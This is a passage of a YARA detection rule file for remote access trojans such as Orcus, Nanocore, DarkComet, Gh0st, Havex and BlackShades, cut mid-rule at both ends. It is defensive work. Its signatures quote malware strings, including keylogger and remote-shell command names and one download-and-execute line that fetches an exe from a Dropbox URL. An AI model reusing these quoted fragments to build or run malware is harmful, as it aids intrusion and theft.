author = " J from THL <j@techhelplist.com> with thx to MalwareHunterTeam"
date = "2017/01"
reference = "https://virustotal.com/en/file/0ef747363828342c184303f2d6fbead054200e9c223e5cfc4777cda03006e317/analysis/"
version = 1
maltype = "RAT"
filetype = "memory"
strings:
$text01 = "Orcus.CommandManagement"
$text02 = "Orcus.Commands."
$text03 = "Orcus.Config."
$text04 = "Orcus.Connection."
$text05 = "Orcus.Core."
$text06 = "Orcus.exe"
$text07 = "Orcus.Extensions."
$text08 = "Orcus.InstallationPromptForm"
$text09 = "Orcus.MainForm."
$text10 = "Orcus.Native."
$text11 = "Orcus.Plugins."
$text12 = "orcus.plugins.dll"
$text13 = "Orcus.Properties."
$text14 = "Orcus.Protection."
$text15 = "Orcus.Share."
$text16 = "Orcus.Shared"
$text17 = "Orcus.StaticCommands"
$text18 = "Orcus.Utilities."
$text19 = "\\Projects\\Orcus\\Source\\Orcus."
$text20 = ".orcus.plugins.dll.zip"
$text21 = ".orcus.shared.dll.zip"
$text22 = ".orcus.shared.utilities.dll.zip"
$text23 = ".orcus.staticcommands.dll.zip"
$text24 = "HvncCommunication"
$text25 = "HvncAction"
$text26 = "hvncDesktop"
$text27 = ".InstallationPromptForm"
$text28 = "RequestKeyLogCommand"
$text29 = "get_KeyLogFile"
$text30 = "LiveKeyloggerCommand"
$text31 = "ORCUS.STATICCOMMANDS, VERSION="
$text32 = "PrepareOrcusFileToRemove"
$text33 = "ConvertFromOrcusValueKind"
condition:
13 of them
}
rule SSC_NetWiredRC_B : RAT
{
meta:
description = "NetWiredRC"
author = "Jean-Philippe Teissier / @Jipe_"
date = "2014-12-23"
filetype = "memory"
version = "1.1"
strings:
$mutex = "LmddnIkX"
$str1 = "%s.Identifier"
$str2 = "%d:%I64u:%s%s;"
$str3 = "%s%.2d-%.2d-%.4d"
$str4 = "[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]"
$str5 = "%.2d/%.2d/%d %.2d:%.2d:%.2d"
$klg1 = "[Backspace]"
$klg2 = "[Enter]"
$klg3 = "[Tab]"
$klg4 = "[Arrow Left]"
$klg5 = "[Arrow Up]"
$klg6 = "[Arrow Right]"
$klg7 = "[Arrow Down]"
$klg8 = "[Home]"
$klg9 = "[Page Up]"
$klg10 = "[Page Down]"
$klg11 = "[End]"
$klg12 = "[Break]"
$klg13 = "[Delete]"
$klg14 = "[Insert]"
$klg15 = "[Print Screen]"
$klg16 = "[Scroll Lock]"
$klg17 = "[Caps Lock]"
$klg18 = "[Alt]"
$klg19 = "[Esc]"
$klg20 = "[Ctrl+%c]"
condition:
$mutex or (1 of ($str*) and 1 of ($klg*))
}
rule SSC_Nanocore_RAT_Gen_1 {
meta:
description = "Detetcs the Nanocore RAT and similar malware"
author = "Florian Roth"
reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
date = "2016-04-22"
score = 70
hash1 = "e707a7745e346c5df59b5aa4df084574ae7c204f4fb7f924c0586ae03b79bf06"
strings:
$x1 = "C:\\Users\\Logintech\\Dropbox\\Projects\\New folder\\Latest\\Benchmark\\Benchmark\\obj\\Release\\Benchmark.pdb" fullword ascii
$x2 = "RunPE1" fullword ascii
$x3 = "082B8C7D3F9105DC66A7E3267C9750CF43E9D325" fullword ascii
$x4 = "$374e0775-e893-4e72-806c-a8d880a49ae7" fullword ascii
$x5 = "Monitorinjection" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and ( 1 of them ) ) or ( 3 of them )
}
rule SSC_Nanocore_RAT_Gen_2 {
meta:
description = "Detetcs the Nanocore RAT"
author = "Florian Roth"
score = 100
reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
date = "2016-04-22"
hash1 = "755f49a4ffef5b1b62f4b5a5de279868c0c1766b528648febf76628f1fe39050"
strings:
$x1 = "NanoCore.ClientPluginHost" fullword ascii
$x2 = "IClientNetworkHost" fullword ascii
$x3 = "#=qjgz7ljmpp0J7FvL9dmi8ctJILdgtcbw8JYUc6GC8MeJ9B11Crfg2Djxcf0p8PZGe" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or ( all of them )
}
rule SSC_Nanocore_RAT_Sample_1 {
meta:
description = "Detetcs a certain Nanocore RAT sample"
author = "Florian Roth"
score = 75
reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
date = "2016-04-22"
hash2 = "b7cfc7e9551b15319c068aae966f8a9ff563b522ed9b1b42d19c122778e018c8"
strings:
$x1 = "TbSiaEdJTf9m1uTnpjS.n9n9M7dZ7FH9JsBARgK" fullword wide
$x2 = "1EF0D55861681D4D208EC3070B720C21D885CB35" fullword ascii
$x3 = "popthatkitty.Resources.resources" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 900KB and ( 1 of ($x*) ) ) or ( all of them )
}
rule SSC_Nanocore_RAT_Sample_2 {
meta:
description = "Detetcs a certain Nanocore RAT sample"
author = "Florian Roth"
score = 75
reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
date = "2016-04-22"
hash1 = "51142d1fb6c080b3b754a92e8f5826295f5da316ec72b480967cbd68432cede1"
strings:
$s1 = "U4tSOtmpM" fullword ascii
$s2 = ")U71UDAU_QU_YU_aU_iU_qU_yU_" fullword wide
$s3 = "Cy4tOtTmpMtTHVFOrR" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 40KB and all of ($s*)
}
rule SSC_Meterpreter_Reverse_Tcp {
meta: // This is the standard backdoor/RAT from Metasploit, could be used by any actor
author = "chort (@chort0)"
description = "Meterpreter reverse TCP backdoor in memory. Tested on Win7x64."
strings:
$a = { 4d 45 54 45 52 50 52 45 54 45 52 5f 54 52 41 4e 53 50 4f 52 54 5f 53 53 4c [32-48] 68 74 74 70 73 3a 2f 2f 58 58 58 58 58 58 } // METERPRETER_TRANSPORT_SSL  https://XXXXXX
$b = { 4d 45 54 45 52 50 52 45 54 45 52 5f 55 41 } // METERPRETER_UA
$c = { 47 45 54 20 2f 31 32 33 34 35 36 37 38 39 20 48 54 54 50 2f 31 2e 30 } // GET /123456789 HTTP/1.0
$d = { 6d 65 74 73 72 76 2e 64 6c 6c [2-4] 52 65 66 6c 65 63 74 69 76 65 4c 6f 61 64 65 72 } // metsrv.dll  ReflectiveLoader
condition:
$a or (any of ($b, $d) and $c)
}
rule SSC_apt_win32_dll_rat_hiZor_RAT: RAT
{
meta:
description = "Detects hiZor RAT"
hash1 = "75d3d1f23628122a64a2f1b7ef33f5cf"
hash2 = "d9821468315ccd3b9ea03161566ef18e"
hash3 = "b9af5f5fd434a65d7aa1b55f5441c90a"
ref1 = "http://www.threatgeek.com/2016/01/introducing-hi-zor-rat.html"
ref2 = "https://github.com/Neo23x0/Loki/blob/b187ed063d73d0defc6958100ca7ad04aa77fc12/signatures/apt_hizor_rat.yar"
reference = "https://www.fidelissecurity.com/sites/default/files/FTA_1020_Fidelis_Inocnation_FINAL.pdf"
strings:
// Part of the encoded User-Agent = Mozilla
$s1 = { c7 [5] 40 00 62 00 c7 [5] 77 00 64 00 c7 [5] 61 00 61 00 c7 [5] 6c 00 }
// XOR to decode User-Agent after string stacking 0x10001630
$s2 = { 66 [7] 0d 40 83 ?? ?? 7c ?? }
// XOR with 0x2E - 0x10002EF6
$s3 = { 80 [2] 2e 40 3b ?? 72 ?? }
$s4 = "CmdProcessExited" wide ascii
$s5 = "rootDir" wide ascii
$s6 = "DllRegisterServer" wide ascii
$s7 = "GetNativeSystemInfo" wide ascii
$s8 = "%08x%08x%08x%08x" wide ascii
condition:
(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)
}
rule SSC_apt_win32_dll_rat_1a53b0cp32e46g0qio7
{
meta:
author = "https://www.fidelissecurity.com/"
info = "Indicators for FTA-1020"
hash1 = "75d3d1f23628122a64a2f1b7ef33f5cf"
hash2 = "d9821468315ccd3b9ea03161566ef18e"
hash3 = "b9af5f5fd434a65d7aa1b55f5441c90a"
reference = "https://github.com/fideliscyber"
strings:
// Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0;rv:11.0) like Gecko
$ = { c7 [2] 64 00 63 00 c7 [2] 69 00 62 00 c7 [2] 7a 00 7e 00 c7 [2] 2d 00 43 00 c7 [2] 59 00 2d 00 c7 [2] 3b 00 23 00 c7 [2] 3e 00 36 00 c7 [2] 2d 00 5a 00 c7 [2] 42 00 5a 00 c7 [2] 3b 00 39 00 c7 [2] 36 00 2d 00 c7 [2] 59 00 7f 00 c7 [2] 64 00 69 00 c7 [2] 68 00 63 00 c7 [2] 79 00 22 00 c7 [2] 3a 00 23 00 c7 [2] 3d 00 36 00 c7 [2] 2d 00 7f 00 c7 [2] 7b 00 37 00 c7 [2] 3c 00 3c 00 c7 [2] 23 00 3d 00 c7 [2] 24 00 2d 00 c7 [2] 61 00 64 00 c7 [2] 66 00 68 00 c7 [2] 2d 00 4a 00 c7 [2] 68 00 6e 00 c7 [2] 66 00 62 00 } // offset 10001566
// Software\Microsoft\Windows\CurrentVersion\Run
$ = { c7 [2] 23 00 24 00 c7 [2] 24 00 33 00 c7 [2] 38 00 22 00 c7 [2] 00 00 33 00 c7 [2] 24 00 25 00 c7 [2] 3f 00 39 00 c7 [2] 38 00 0a 00 c7 [2] 04 00 23 00 c7 [2] 38 00 00 00 c7 [2] 43 00 66 00 c7 [2] 6d 00 60 00 c7 [2] 67 00 52 00 c7 [2] 6e 00 63 00 c7 [2] 7b 00 67 00 c7 [2] 70 00 00 00 c7 [2] 43 00 4d 00 c7 [2] 44 00 00 00 c7 [2] 0f 00 43 00 c7 [2] 00 00 50 00 c7 [2] 49 00 4e 00 c7 [2] 47 00 00 00 c7 [2] 11 00 12 00 c7 [2] 17 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 11 00 06 00 c7 [2] 44 00 45 00 c7 [2] 4c 00 00 00 } // 10003D09
$ = { 66 [4-7] 0d 40 83 f8 44 7c ?? }
// xor		word ptr [ebp+eax*2+var_5C], 14h
// inc		eax
// cmp     	eax, 14h
// Loop to decode a static string. It reveals the "1a53b0cp32e46g0qio9" static string sent in the beacon
$ = { 66 [4-7] 14 40 83 f8 14 7c ?? } // 100017F0
$ = { 66 [4-7] 56 40 83 f8 2d 7c ?? } // 10003621
$ = { 66 [4-7] 20 40 83 f8 1a 7c ?? } // 10003640
$ = { 80 [2-7] 2e 40 3d 50 02 00 00 72 ?? } //  10003930
$ = "%08x%08x%08x%08x" wide ascii
$ = "WinHttpGetIEProxyConfigForCurrentUser" wide ascii
condition:
(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)
}
rule SSC_Indetectables_RAT: RAT {
meta:
description = "Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux"
author = "Florian Roth"
reference = "http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/"
date = "2015-10-01"
super_rule = 1
hash1 = "081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105"
hash2 = "66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229"
hash3 = "1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801"
strings:
$s1 = "Coded By M3" fullword wide
$s2 = "Stub Undetector M3" fullword wide
$s3 = "www.webmenegatti.com.br" wide
$s4 = "M3n3gatt1" fullword wide
$s5 = "TheMisterFUD" fullword wide
$s6 = "KillZoneKillZoneKill" fullword ascii
$s7 = "[[__M3_F_U_D_M3__]]$" fullword ascii
$s8 = "M3_F_U_D_M3" ascii
$s9 = "M3n3gatt1hack3r" fullword wide
$s9a = "M3n3gatt1hack3r" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 5000KB and 1 of them
}
rule SSC_BergSilva_Malware : RAT {
meta:
description = "Detects a malware from the same author as the Indetectables RAT"
author = "Florian Roth"
date = "2015-10-01"
super_rule = 1
hash1 = "00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e"
hash2 = "6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc"
strings:
$x1 = "C:\\Users\\Berg Silva\\Desktop\\" wide
$x2 = "URLDownloadToFileA 0, \"https://dl.dropbox.com/u/105015858/nome.exe\", \"c:\\nome.exe\", 0, 0" fullword wide
$s1 = " Process.Start (Path.GetTempPath() & \"name\" & \".exe\") 'start server baixado" fullword wide
$s2 = "FileDelete(@TempDir & \"\\nome.exe\") ;Deleta o Arquivo para que possa ser executado normalmente" fullword wide
$s3 = " Lib \"\\WINDOWS\\system32\\UsEr32.dLl\"" fullword wide
$s4 = "$Directory = @TempDir & \"\\nome.exe\" ;Define a variavel" fullword wide
$s5 = "https://dl.dropbox.com/u/105015858" wide
condition:
uint16(0) == 0x5a4d and ( 1 of ($x*) or 2 of ($s*) )
}
rule SSC_SANS_ICS_Cybersecurity_Challenge_400_Havex_Memdump : memory
{
meta:
description = "Detects Havex Windows process executable from memory dump"
date = "2015-12-2"
author = "Chris Sistrunk"
hash = "8065674de8d79d1c0e7b3baf81246e7d"
strings:
$magic = { 4d 5a }
$s1 = "~tracedscn.yls" fullword wide
$s2 = "[!]Start" fullword wide
$s3 = "[+]Get WSADATA" fullword wide
$s4 = "[-]Can not get local ip" fullword wide
$s5 = "[+]Local:" fullword wide
$s6 = "[-]Threads number > Hosts number" fullword wide
$s7 = "[-]Connection error" fullword wide
$x1 = "bddd4e2b84fa2ad61eb065e7797270ff.exe" fullword wide
condition:
$magic at 0 and ( 3 of ($s*) or $x1 )
}
rule SSC_Havex_Trojan_PHP_Server
{
meta:
Author      = "Florian Roth"
Date        = "2014/06/24"
Description = "Detects the PHP server component of the Havex RAT"
Reference   = "www.f-secure.com/weblog/archives/00002718.html"
strings:
$s1 = "havex--></body></head>"
$s2 = "ANSWERTAG_START"
$s3 = "PATH_BLOCKFILE"
condition:
all of them
}
rule SSC_Win32OPCHavex
{
meta:
Author      = "BAE Systems"
Date        = "2014/06/23"
Description = "Rule for identifying OPC version of HAVEX"
Reference   = "www.f-secure.com/weblog/archives/00002718.html"
strings:
$mzhdr = "MZ"
$dll = "7CFC52CD3F87.dll"
$a1 = "Start finging of LAN hosts..." wide
$a2 = "Finding was fault. Unexpective error" wide
$a3 = "Was found %i hosts in LAN:" wide
$a4 = "Hosts was't found." wide
$a5 = "Start finging of OPC Servers..." wide
$a6 = "Was found %i OPC Servers." wide
$a7 = "OPC Servers not found. Programm finished" wide
$a8 = "%s[%s]!!!EXEPTION %i!!!" wide
$a9 = "Start finging of OPC Tags..." wide
condition:
$mzhdr at 0 and ($dll or (any of ($a*)))
}
rule SSC_Win32FertgerHavex
{
meta:
Author      = "BAE Systems"
Date        = "2014/06/23"
Description = "Rule for identifying Fertger version of HAVEX"
Reference   = "www.f-secure.com/weblog/archives/00002718.html"
strings:
$mz = "MZ"
$a1="\\\\.\\pipe\\mypipe-f" wide
$a2="\\\\.\\pipe\\mypipe-h" wide
$a3="\\qln.dbx" wide
$a4="*.yls" wide
$a5="\\*.xmd" wide
$a6="fertger" wide
$a7="havex"
condition:
$mz at 0 and 3 of ($a*)
}
rule SSC_MW_gholee_v1 : v1
{
meta:
Author = "@GelosSnake"
description = "http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html"
date = "2014-08"
maltype = "Remote Access Trojan"
sample_filetype = "dll"
hash0 = "48573a150562c57742230583456b4c02"
strings:
$a = "sandbox_avg10_vc9_SP1_2011"
$b = "gholee"
condition:
all of them
}
rule SSC_MW_gholee_v2 : v2
{
meta:
author = "@GelosSnake"
date = "2015-02-12"
description = "http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html"
hash0 = "05523761ca296ec09afdf79477e5f18d"
hash1 = "08e424ac42e6efa361eccefdf3c13b21"
hash2 = "5730f925145f1a1cd8380197e01d9e06"
hash3 = "73461c8578dd9ab86d42984f30c04610"
sample_filetype = "dll"
strings:
$string0 = "RichHa"
$string1 = "         (((((                  H" wide
$string2 = "1$1,141<1D1L1T1\\1d1l1t1"
$string3 = "<8;$O' "
$string4 = "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]"
$string5 = "jYPQTVTSkllZTTXRTUiHceWda/"
$string6 = "urn:schemas-microsoft-com:asm.v1"
$string7 = "8.848H8O8i8s8y8"
$string8 = "wrapper3" wide
$string9 = "pwwwwwwww"
$string10 = "Sunday"
$string11 = "YYuTVWh"
$string12 = "DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN"
$string13 = "ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt"
$string15 = "wrapper3 Version 1.0" wide
$string16 = "77A779"
$string17 = "<C<G<M<R<X<"
$string18 = "9 9-9N9X9s9"
condition:
18 of them
}
rule SSC_gholeeV2
{
meta:
Author = "@GelosSnake"
Date = "2015-02-12"
Description = "Gholee first discovered variant "
Reference = "http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html"
strings:
$string0 = "RichHa"
$string1 = "         (((((                  H" wide
$string2 = "1$1,141<1D1L1T1\\1d1l1t1"
$string3 = "<8;$O' "
$string4 = "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]"
$string5 = "jYPQTVTSkllZTTXRTUiHceWda/"
$string6 = "urn:schemas-microsoft-com:asm.v1"
$string7 = "8.848H8O8i8s8y8"
$string8 = "wrapper3" wide
$string9 = "pwwwwwwww"
$string10 = "Sunday"
$string11 = "YYuTVWh"
$string12 = "DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN"
$string13 = "ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt"
$string15 = "wrapper3 Version 1.0" wide
$string16 = "77A779"
$string17 = "<C<G<M<R<X<"
$string18 = "9 9-9N9X9s9"
condition:
18 of them
}
rule SSC_gholeeV1
{
meta:
Author = "@GelosSnake"
Date = "2014/08"
Description = "Gholee first discovered variant "
Reference = "http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html"
strings:
$a = "sandbox_avg10_vc9_SP1_2011"
$b = "gholee"
condition:
all of them
}
rule SSC_Gh0st : RAT
{
meta:
description = "Gh0st"
author = "botherder https://github.com/botherder"
strings:
$ = /(G)host/
$ = /(i)nflate 1\.1\.4 Copyright 1995-2002 Mark Adler/
$ = /(d)eflate 1\.1\.4 Copyright 1995-2002 Jean-loup Gailly/
$ = /(%)s\\shell\\open\\command/
$ = /(G)etClipboardData/
$ = /(W)riteProcessMemory/
$ = /(A)djustTokenPrivileges/
$ = /(W)inSta0\\Default/
$ = /(#)32770/
$ = /(#)32771/
$ = /(#)32772/
$ = /(#)32774/
condition:
all of them
}
rule SSC_gh0st
{
meta:
author = "https://github.com/jackcr/"
strings:
$a = { 47 68 30 73 74 ?? ?? ?? ?? ?? ?? ?? ?? 78 9C }
$b = "Gh0st Update"
condition:
any of them
}
rule SSC_APT_WIN_Gh0st_ver : RAT
{
meta:
author = "@BryanNolen"
date = "2012-12"
type = "APT"
version = "1.1"
ref = "Detection of Gh0st RAT server DLL component"
ref1 = "http://www.mcafee.com/au/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf"
strings:
$library = "deflate 1.1.4 Copyright 1995-2002 Jean-loup Gailly"
$capability = "GetClipboardData"
$capability1 = "capCreateCaptureWindowA"
$capability2 = "CreateRemoteThread"
$capability3 = "WriteProcessMemory"
$capability4 = "LsaRetrievePrivateData"
$capability5 = "AdjustTokenPrivileges"
$function = "ResetSSDT"
$window = "WinSta0\\Default"
$magic = {47 6C 6F 62 61 6C 5C [5-9] 20 25 64}    /* $magic = "Gh0st" */
condition:
all of them
}
rule SSC_CrowdStrike_CSIT_14003_03 : installer
{
meta:
copyright = "CrowdStrike, Inc"
description = "Flying Kitten Installer"
version = "1.0"
actor = "FLYING KITTEN"
in_the_wild = true
strings:
$exename = "IntelRapidStart.exe"
$confname = "IntelRapidStart.exe.config"
$cabhdr = { 4d 53 43 46 00 00 00 00 }
condition:
all of them
}
rule SSC_FlyingKitten : rat
{
meta:
Author      = "CrowdStrike, Inc"
Date        = "2014/05/13"
Description = "Flying Kitten RAT"
Reference   = "http://blog.crowdstrike.com/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten"
strings:
$classpath = "Stealer.Properties.Resources.resources"
$pdbstr = "\\Stealer\\obj\\x86\\Release\\Stealer.pdb"
condition:
all of them and uint16(0) == 0x5A4D and uint32(uint32(0x3c)) == 0x4550 and uint16(uint32(0x3C) + 0x16) & 0x2000 == 0 and ((uint16(uint32(0x3c)+24) == 0x010b and uint32(uint32(0x3c)+232) > 0) or (uint16(uint32(0x3c)+24) == 0x020b and uint32(uint32(0x3c)+248) > 0))
}
rule SSC_DarkComet_3 : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/DarkComet"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
// Versions 2x
$a1 = "#BOT#URLUpdate"
$a2 = "Command successfully executed!"
$a3 = "MUTEXNAME" wide
$a4 = "NETDATA" wide
// Versions 3x & 4x & 5x
$b1 = "FastMM Borland Edition"
$b2 = "%s, ClassID: %s"
$b3 = "I wasn't able to open the hosts file"
$b4 = "#BOT#VisitUrl"
$b5 = "#KCMDDC"
condition:
all of ($a*) or all of ($b*)
}
rule SSC_DarkComet_2 : rat
{
meta:
description = "DarkComet"
author = "Jean-Philippe Teissier / @Jipe_"
date = "2013-01-12"
filetype = "memory"
version = "1.0"
strings:
$a = "#BEGIN DARKCOMET DATA --"
$b = "#EOF DARKCOMET DATA --"
$c = "DC_MUTEX-"
$k1 = "#KCMDDC5#-890"
$k2 = "#KCMDDC51#-890"
condition:
any of them
}
rule SSC_DarkComet_4  : RAT
{	meta:
reference = "https://github.com/bwall/bamfdetect/blob/master/BAMF_Detect/modules/yara/darkcomet.yara"
strings:
$a1 = "#BOT#"
$a2 = "WEBCAMSTOP"
$a3 = "UnActiveOnlineKeyStrokes"
$a4 = "#SendTaskMgr"
$a5 = "#RemoteScreenSize"
$a6 = "ping 127.0.0.1 -n 4 > NUL &&"
condition:
all of them
}
rule SSC_DarkComet_5
{
meta:
maltype = "DarkComet RAT"
author = "https://github.com/reed1713"
description = "Malware creates the MSDCSC directory, which is a common path utilized by DarkComet, as well as the mutex pattern."
strings:
$type="Microsoft-Windows-Security-Auditing"
$eventid="4688"
$data=/AppData\\Local\\Temp\\MSDCSC\\/
$fix = ".exe"
$type1="Microsoft-Windows-Security-Auditing"
$eventid1="4674"
$data1=/DC_MUTEX-[0-9A-Z]{7}/
condition:
($type and $eventid and $data and $fix) or ($type1 and $eventid1 and $data1)
}
rule SSC_DarkComet_1 : RAT
{
meta:
description = "DarkComet RAT"
author = "botherder https://github.com/botherder"
strings:
$bot1 = /(#)BOT#OpenUrl/ wide ascii
$bot2 = /(#)BOT#Ping/ wide ascii
$bot3 = /(#)BOT#RunPrompt/ wide ascii
$bot4 = /(#)BOT#SvrUninstall/ wide ascii
$bot5 = /(#)BOT#URLDownload/ wide ascii
$bot6 = /(#)BOT#URLUpdate/ wide ascii
$bot7 = /(#)BOT#VisitUrl/ wide ascii
$bot8 = /(#)BOT#CloseServer/ wide ascii
$ddos1 = /(D)DOSHTTPFLOOD/ wide ascii
$ddos2 = /(D)DOSSYNFLOOD/ wide ascii
$ddos3 = /(D)DOSUDPFLOOD/ wide ascii
$keylogger1 = /(A)ctiveOnlineKeylogger/ wide ascii
$keylogger2 = /(U)nActiveOnlineKeylogger/ wide ascii
$keylogger3 = /(A)ctiveOfflineKeylogger/ wide ascii
$keylogger4 = /(U)nActiveOfflineKeylogger/ wide ascii
$shell1 = /(A)CTIVEREMOTESHELL/ wide ascii
$shell2 = /(S)UBMREMOTESHELL/ wide ascii
$shell3 = /(K)ILLREMOTESHELL/ wide ascii
condition:
4 of ($bot*) or all of ($ddos*) or all of ($keylogger*) or all of ($shell*)
}
rule SSC_DarkComet_Keylogger_File  : RAT
{
meta:
author = "Florian Roth"
description = "Looks like a keylogger file created by DarkComet Malware"
date = "25.07.14"
reference = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
score = 50
strings:
$magic = "::"
$entry = /\n:: [A-Z]/
$timestamp = /\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\)/
condition:
($magic at 0) and #entry > 10 and #timestamp > 10
}
rule SSC_Crimson: RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
Description = "Crimson Rat"
date = "2015/05"
ref = "http://malwareconfig.com/stats/Crimson"
maltype = "Remote Access Trojan"
filetype = "jar"
strings:
$a1 = "com/crimson/PK"
$a2 = "com/crimson/bootstrapJar/PK"
$a3 = "com/crimson/permaJarMulti/PermaJarReporter$1.classPK"
$a4 = "com/crimson/universal/containers/KeyloggerLog.classPK"
$a5 = "com/crimson/universal/UploadTransfer.classPK"
condition:
all of ($a*)
}
rule SSC_Cerberus : RAT memory
{
meta:
description = "Cerberus"
author = "Jean-Philippe Teissier / @Jipe_"
date = "2013-01-12"
filetype = "memory"
version = "1.0"
strings:
$checkin = "Ypmw1Syv023QZD"
$clientpong = "wZ2pla"
$serverping = "wBmpf3Pb7RJe"
$generic = "cerberus" nocase
condition:
any of them
}
rule SSC_Bolonyokte : rat
{
meta:
description = "UnknownDotNet RAT - Bolonyokte"
author = "Jean-Philippe Teissier / @Jipe_"
date = "2013-02-01"
filetype = "memory"
version = "1.0"
strings:
$campaign1 = "Bolonyokte" ascii wide
$campaign2 = "donadoni" ascii wide
$decoy1 = "nyse.com" ascii wide
$decoy2 = "NYSEArca_Listing_Fees.pdf" ascii wide
$decoy3 = "bf13-5d45cb40" ascii wide
$artifact1 = "Backup.zip"  ascii wide
$artifact2 = "updates.txt" ascii wide
$artifact3 = "vdirs.dat" ascii wide
$artifact4 = "default.dat"
$artifact5 = "index.html"
$artifact6 = "mime.dat"
$func1 = "FtpUrl"
$func2 = "ScreenCapture"
$func3 = "CaptureMouse"
$func4 = "UploadFile"
$ebanking1 = "Internet Banking" wide
$ebanking2 = "(Online Banking)|(Online banking)"
$ebanking3 = "(e-banking)|(e-Banking)" nocase
$ebanking4 = "login"
$ebanking5 = "en ligne" wide
$ebanking6 = "bancaires" wide
$ebanking7 = "(eBanking)|(Ebanking)" wide
$ebanking8 = "Anmeldung" wide
$ebanking9 = "internet banking" nocase wide
$ebanking10 = "Banking Online" nocase wide
$ebanking11 = "Web Banking" wide
$ebanking12 = "Power"
condition:
any of ($campaign*) or 2 of ($decoy*) or 2 of ($artifact*) or all of ($func*) or 3 of ($ebanking*)
}
rule SSC_BlackShades_4 : rat
{
meta:
description = "BlackShades"
author = "Jean-Philippe Teissier / @Jipe_"
date = "2013-01-12"
filetype = "memory"
version = "1.0"
strings:
$a = { 42 00 6C 00 61 00 63 00 6B 00 73 00 68 00 61 00 64 00 65 00 73 }
$b = { 36 00 3C 00 32 00 20 00 32 00 32 00 26 00 31 00 39 00 3E 00 1D 00 17 00 17 00 1C 00 07 00 1B 00 03 00 07 00 28 00 23 00 0C 00 1D 00 10 00 1B 00 12 00 00 00 28 00 37 00 10 00 01 00 06 00 11 00 0B 00 07 00 22 00 11 00 17 00 00 00 1D 00 1B 00 0B 00 2F 00 26 00 01 00 0B }
$c = { 62 73 73 5F 73 65 72 76 65 72 }
$d = { 43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44 }
$e = { 6D 6F 64 49 6E 6A 50 45 }
$apikey = "f45e373429c0def355ed9feff30eff9ca21eec0fafa1e960bea6068f34209439"
condition:
any of ($a, $b, $c, $d, $e) or $apikey
}
rule SSC_BlackShades : Trojan
{
meta:
author="Kevin Falcoz"
date="26/06/2013"
description="BlackShades Server"
strings:
$signature1={62 73 73 5F 73 65 72 76 65 72}
$signature2={43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44}
$signature3={6D 6F 64 49 6E 6A 50 45}
condition:
$signature1 and $signature2 and $signature3
}
rule SSC_BlackShades2 : Trojan RAT
{
meta:
author="Kevin Falcoz"
date="26/06/2013"
description="BlackShades Server"
strings:
$signature1={62 73 73 5F 73 65 72 76 65 72}
$signature2={43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44}
$signature3={6D 6F 64 49 6E 6A 50 45}
condition:
$signature1 and $signature2 and $signature3
}
rule SSC_BlackShades_3 : Trojan RAT
{
meta:
description = "BlackShades RAT"
author = "botherder https://github.com/botherder"
strings:
$mod1 = /(m)odAPI/
$mod2 = /(m)odAudio/
$mod3 = /(m)odBtKiller/
$mod4 = /(m)odCrypt/
$mod5 = /(m)odFuctions/
$mod6 = /(m)odHijack/
$mod7 = /(m)odICallBack/
$mod8 = /(m)odIInet/
$mod9 = /(m)odInfect/
$mod10 = /(m)odInjPE/
$mod11 = /(m)odLaunchWeb/
$mod12 = /(m)odOS/
$mod13 = /(m)odPWs/
$mod14 = /(m)odRegistry/
$mod15 = /(m)odScreencap/
$mod16 = /(m)odSniff/
$mod17 = /(m)odSocketMaster/
$mod18 = /(m)odSpread/
$mod19 = /(m)odSqueezer/
$mod20 = /(m)odSS/
$mod21 = /(m)odTorrentSeed/
$tmr1 = /(t)mrAlarms/
$tmr2 = /(t)mrAlive/
$tmr3 = /(t)mrAnslut/
$tmr4 = /(t)mrAudio/
$tmr5 = /(t)mrBlink/
$tmr6 = /(t)mrCheck/
